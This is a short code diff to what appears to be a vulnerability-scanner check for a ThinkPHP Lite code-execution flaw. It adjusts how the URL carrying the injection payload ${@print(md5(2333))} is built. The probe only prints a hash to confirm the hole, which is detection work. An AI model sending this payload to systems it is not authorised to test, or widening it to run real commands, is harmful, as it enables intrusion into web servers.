@@ -11,7 +11,7 @@ import requests
 def run(url, timeout):
     RESULT_NAME = 'Thinkphp_lite_code_exec'
     EXPECTED_HASH = '56540676a129760a3'  # MD5 hash of '2333'
-    PAYLOAD = 'index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D'
+    PAYLOAD = '/index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D'
 
     result = {
         'name': RESULT_NAME,
@@ -26,7 +26,7 @@ def run(url, timeout):
     }
 
     try:
-        vurl = urllib.parse.urljoin(url, PAYLOAD)
+        vurl = url + PAYLOAD
         response = requests.get(vurl, headers=headers, timeout=15)
 
         if EXPECTED_HASH in response.text:
